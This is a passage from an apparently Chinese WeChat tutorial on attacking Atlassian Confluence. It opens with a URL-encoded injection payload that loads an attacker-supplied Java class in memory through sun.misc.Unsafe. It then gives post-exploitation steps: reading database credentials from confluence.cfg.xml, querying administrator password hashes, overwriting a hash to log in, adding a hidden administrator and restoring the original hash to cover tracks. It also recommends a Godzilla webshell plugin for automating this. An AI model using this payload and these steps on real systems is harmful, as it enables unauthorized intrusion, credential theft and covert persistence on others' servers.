    code=var+data%3dcom.atlassian.core.filters.ServletContextThreadLocal.getRequest().getParameter('data')%3bvar+safe%3djava.lang.Class.forName('sun.misc.Unsafe')%3bvar+safeCon%3dsafe.getDeclaredField('theUnsafe')%3bsafeCon.setAccessible(true)%3bvar+unSafe%3dsafeCon.get(null)%3bvar+dataBytes%3djava.util.Base64.getDecoder().decode(data)%3bvar+mem%3dunSafe.defineAnonymousClass(java.io.File.class,dataBytes,null)%3bmem.newInstance()%3bvar+a%3d'atlassian'%3ba%3b&data=yv66vgAAADEB.............请自行生成

  

  

 **05 后渗透**

 **小tips**

1、默认配置文件位置

Linux

  * 

    
    
    /var/atlassian/application/data/confluence/confluence.cfg.xml

Windows

  * 

    
    
    C:/Atlassian/Application/Data/Confluence/confluence.cfg.xml

得到数据库配置文件：  

![](https://gitee.com/fuli009/images/raw/master/public/20230629083538.png)

  *   *   * 

    
    
    <property name="hibernate.connection.password">xxxxx123</property><property name="hibernate.connection.url">jdbc:mysql://127.0.0.1:3306/confluence</property><property name="hibernate.connection.username">root</property>

在配置文件中获得数据库信息，连接数据库

![](https://gitee.com/fuli009/images/raw/master/public/20230629083540.png)

2、查询所有管理员权限用户

  * 

    
    
    select u.id, u.user_name, u.active from `confluence`.`cwd_user` u join `confluence`.`cwd_membership` m on u.id=m.child_user_id join `confluence`.`cwd_group` g on m.parent_id=g.id join `confluence`.`cwd_directory` d on d.id=g.directory_id where g.group_name = 'confluence-administrators' and d.directory_name='Confluence Internal Directory';

![](https://gitee.com/fuli009/images/raw/master/public/20230629083541.png)

3、查看用户密码

  * 

    
    
    SELECT * FROM "cwd_user" where id=xxxxxx;

在cwd_user表中获得管理员的密文

数据库中存储的是加密的Confluence管理员密码，无法直接进行解密。

  * 

    
    
    {PKCS5S2}m6t9DK84/mpfgNVdYJ9LcFtU/UrI/7+S92N1SQg1p/Ro1ueHZUqto4HrcASdwrTS

用已知的密文进行替换

将管理员用户的密码修改为目前已知的明文密码的密文（不能直接在数据库中添加字段，否则在单个表中添加字段可能会出现问题）。

修改密码后，登陆后台，添加用户并将其加入管理员组。

最后，将管理员密码还原回去。

更改密码

  * 

    
    
    update cwd_user set credential = '{PKCS5S2}V1J8HcMvYsdtnETu2tjA1gFVQ1L3o+dAsNiooSAcSvpRcbkTR8K4Ha/iWgF145gk' where id=xxxxxx;

![](https://gitee.com/fuli009/images/raw/master/public/20230629083542.png)

 **登录后台—— >用户管理——>添加用户——>加管理员组——>还原admin密码**

![](https://gitee.com/fuli009/images/raw/master/public/20230629083544.png)

  

最后推荐一个godzilla插件，实现自动化利用  

https://github.com/BeichenDream/PostConfluence

![](https://gitee.com/fuli009/images/raw/master/public/20230629083545.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629083546.png)

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629083548.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629083549.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

